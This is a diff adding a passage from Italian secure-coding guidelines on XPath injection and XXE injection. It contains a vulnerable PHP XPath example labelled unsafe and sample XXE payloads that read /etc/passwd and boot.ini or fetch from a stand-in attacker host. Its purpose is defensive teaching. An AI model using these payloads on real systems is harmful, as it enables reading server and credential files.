@@ -1,0 +1,56 @@
+ 
+ 
+Linee guida per lo sviluppo sicuro Pag. 132  a 156  
+ 
+caso fosse necessario includere l'input dell’utente  nella query, questo dovrà essere 
+precedentemente validato. 
+• Validare tutti gli input, indipendentemente dalla l oro provenienza. La validazione dovrebbe essere 
+basata su una white list (si dovrebbero accettare s olo i dati che adattano a una struttura 
+specificata, scartando quelli che non la rispettano ). Occorre controllare il tipo del dato, la sua 
+dimensione, l'intervallo di validità (range), il fo rmato ed eventuali valori attesi (white list). 
+Esempio  
+L'applicazione utilizza una stringa inserita dall'u tente per costruire una query XPath: 
+$user = $_GET["user"]; 
+$pass = $_GET["pass"]; 
+ 
+$doc = new DOMDocument(); 
+$doc->load("test.xml"); 
+$xpath = new DOMXPath($doc); 
+ 
+$expression = "/users/user[@name='" . $user . "' an d @pass='" . $pass . "']"; 
+$xpath->evaluate($expression); // Non sicuro 
+ 
+La stringa inserita dall'utente viene sottoposta a encoding prima dell'uso nella query XPath: 
+$user = $_GET["user"]; 
+$pass = $_GET["pass"]; 
+ 
+$doc = new DOMDocument(); 
+$doc->load("test.xml"); 
+$xpath = new DOMXPath($doc); 
+ 
+$user = str_replace("'", "&apos;", $user); 
+$pass = str_replace("'", "&apos;", $pass); 
+ 
+$expression = "/users/user[@name='" . $user . "' an d @pass='" . $pass . "']"; 
+$xpath->evaluate($expression);  
+ 
+Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/643.html,  
+CWE-643: Improper Neutralization of Data within XPa th Expressions ('XPath Injection'). 
+ 
+7.9.11  XML External Entity (XXE) injection 
+Come riconoscerla  
+Si verifica quando un'applicazione fa il parsing e incorpora in automatico i riferimenti di entità DTD , 
+all’interno di un documento XML. Se un attaccante p redispone un documento XML manipolato, può essere 
+in grado di leggere arbitrariamente qualsiasi file del server. 
+Potrebbe inserire, ad esempio, <! ENTITY xxe SYSTEM  "file: /// c: /boot.ini">.  
+Dovrebbe poi aggiungere un riferimento che faccia r iferimento alla definizione di tale entità, ad es. <div> & 
+xxe; </div>. Se il documento XML analizzato viene q uindi restituito all'utente, il risultato includerà  il 
+contenuto sensibile del file di sistema. 
+Ciò è causato dal parser XML, che è configurato per  analizzare automaticamente le dichiarazioni DTD e 
+risolvere i riferimenti alle entità, invece di disa bilitare sia i riferimenti DTD che quelli esterni. 
+Esempio: 
+<!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&x xe;</foo> 
+<!ENTITY xxe SYSTEM "http://www.attacker.com/text.t xt" >]><foo>&xxe;</foo> 
+Come difendersi 
+La soluzione migliore, ovviamente, sarebbe quella d i evitare di elaborare direttamente l'input dell'ut ente, 
+ove possibile. 
